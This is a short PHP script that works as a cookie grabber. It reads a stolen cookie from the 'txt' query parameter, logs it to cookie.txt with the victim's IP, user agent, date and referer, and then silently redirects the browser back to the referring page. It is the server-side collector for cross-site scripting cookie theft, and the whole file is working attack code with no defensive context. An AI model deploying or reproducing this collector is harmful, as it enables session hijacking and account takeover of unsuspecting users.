<?php
//set time zone and date format
date_default_timezone_set("Asia/Tehran");
$date=date("Y-m-d H:i:s");  
$cookie=$_GET['txt'];
$ip=$_SERVER['REMOTE_ADDR'];
$agent=$_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'] ?? null;
//store data
$log="cookie = $cookie\n";
$log.="ip = $ip\n";
$log.="agent = $agent\n";
$log.="date = $date\n";
$log.="REFERER = $referer\n";
$log.="=======\n";
$f=fopen("cookie.txt","a");
fwrite($f,$log);
//$reefer=str_replace("window","wnidow",$reefer);
//$a=split("/",$referer);
header('Location:'. $referer);
?>